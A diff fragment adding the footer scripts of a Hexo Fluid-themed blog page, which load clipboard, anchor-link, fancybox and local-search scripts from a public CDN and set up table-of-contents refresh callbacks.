+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
